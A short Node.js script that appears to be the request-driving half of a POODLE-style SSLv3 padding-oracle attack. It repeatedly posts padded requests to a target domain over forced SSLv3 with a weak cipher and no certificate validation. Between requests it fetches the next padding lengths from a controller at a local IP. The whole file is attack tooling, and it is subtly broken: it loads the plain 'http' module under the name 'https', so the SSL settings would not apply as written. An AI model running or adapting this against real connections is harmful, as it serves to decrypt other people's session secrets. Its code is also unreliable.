const https = require('http');
const url = require('url');

var urllen = 0;
var postlen = 26;
var delay = 10;

function strPad(n) {
    if (n > 0) {
        return Array(n + 1).join("A");
    } else {
        return "";
    }
}


function performSSLRequest() {
    const paddedUrl = "https://testdomain.com" + strPad(urllen);
    const postData = strPad(postlen);

    sendRequest(
        'POST',
        paddedUrl,
        postData,
        function (response) {
            // On successful POST, proceed to query the next request
            queryNextRequest();
        },
        function (errorCode, errorMessage) {
            console.error("Error in performSSLRequest:", errorCode, errorMessage);
        },
        5000
    );
}

function queryNextRequest() {
    sendRequest(
        'GET',
        "http://192.168.0.12/nextRequest",
        null,
        function (response) {
            const res = response.split(":");
            urllen = Number(res[0]);
            postlen = Number(res[1]);

            // Schedule the next SSL request after a delay
            setTimeout(performSSLRequest, delay);
        },
        function (errorCode, errorMessage) {
            console.error("Error in queryNextRequest:", errorCode, errorMessage);
        },
        5000
    );
}


function sendRequest(method, urlStr, data, callback, errorcallback, timeout) {
    const parsedUrl = url.parse(urlStr);

    const sslOptions = {
        port: 443,
        ciphers: 'DES-CBC3-SHA',
        secureProtocol: 'SSLv3_method',
        rejectUnauthorized: false
    };

    const defaultOptions = {
        hostname: parsedUrl.hostname,
        path: parsedUrl.path,
        method: method || 'GET',
    }

    //もしもSSLv3への通信であるのならば、SSLv3用のオプションがないと鍵交換等でエラーが出てしまうため指定しておく
    if (parsedUrl.hostname === "testdomain.com") {
        for (var key in sslOptions) {
            if (sslOptions.hasOwnProperty(key)) {
                defaultOptions[key] = sslOptions[key];
            }
        }
    }


    const req = https.request(defaultOptions, function (res) {
        var responseData = '';
        res.on('data', function (chunk) {
            responseData += chunk; // Append each chunk to responseData
        });

        res.on('end', function () {
            callback && callback(responseData.toString());
        });
    });

    req.on('error', function (err) {
        errorcallback && errorcallback(err.code, err.message);
    });

    req.setTimeout(timeout || 5000, function () {
        req.abort();
        if (errorcallback) errorcallback('ETIMEDOUT', 'Request timed out');
    });

    if (data) {
        req.write(Array(101).join('a') + data);
    }

    req.end();
}

performSSLRequest();